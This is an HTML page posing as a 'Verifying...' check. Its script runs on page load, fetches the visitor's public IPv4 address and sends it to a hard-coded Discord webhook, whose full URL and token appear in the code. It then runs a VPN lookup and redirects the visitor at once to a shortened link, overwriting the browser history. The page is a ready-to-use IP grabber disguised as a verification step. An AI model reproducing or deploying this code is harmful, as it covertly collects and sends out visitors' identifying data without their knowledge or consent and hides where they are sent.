<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Verification</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <h1>Verifying...</h1>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        const REDIRECT_URL = "https://is.gd/gwuu9c";

        async function getIPv4() {
            try {
                const response = await fetch("https://api4.ipify.org?format=json");
                if (!response.ok) throw new Error("Failed to fetch IPv4");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IPv4:", error);
                return null;
            }
        }

        async function sendToWebhook(ip) {
            try {
                const payload = { content: `New Visitor IPv4: ${ip}` };
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Error sending IPv4 to webhook:", error);
            }
        }

        async function checkVPN(ip) {
            // Example: This API checks for VPNs, proxies, etc. (you'd need to sign up for such a service)
            try {
                const response = await fetch(`https://vpnapi.io/api/${ip}?key=your_api_key`);
                const data = await response.json();
                if (data.vpn) {
                    console.log("VPN detected!");
                }
            } catch (error) {
                console.error("Error checking VPN:", error);
            }
        }

        (async function () {
            const ip = await getIPv4();
            if (ip) {
                await sendToWebhook(ip);
                await checkVPN(ip);
            }

            // Redirect immediately after sending info
            history.replaceState(null, '', REDIRECT_URL); // Replaces the URL with the redirect URL
            window.location.href = REDIRECT_URL; // Redirects immediately
        })();
    </script>

</body>
</html>
